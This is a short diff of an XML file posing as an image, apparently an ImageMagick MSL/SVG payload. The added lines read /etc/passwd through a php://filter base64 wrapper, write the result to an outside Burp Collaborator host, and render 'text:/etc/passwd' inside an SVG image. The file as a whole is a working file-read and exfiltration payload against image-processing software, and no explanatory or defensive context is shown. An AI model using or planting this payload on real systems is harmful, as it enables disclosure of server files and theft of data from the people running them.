@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!-- <svg> -->
 <image>
-  <read filename="/etc/passwd" />
-  <write filename="/var/www/2ab6c66f-796e-4324-b881-fd6c3b0d4b5c" />
+  <read filename="php://filter/convert.base64-encode/resource=/etc/passwd" />
+  <write filename="http://tc904jnhst7o84z18ei5lpcdb4hu5j.burpcollaborator.net/image.txt" />
   <svg width="120px" height="120px">
-    <image href="image.png" />
+    <image width="120" height="120" href="text:/etc/passwd" />
   </svg>
 </image>
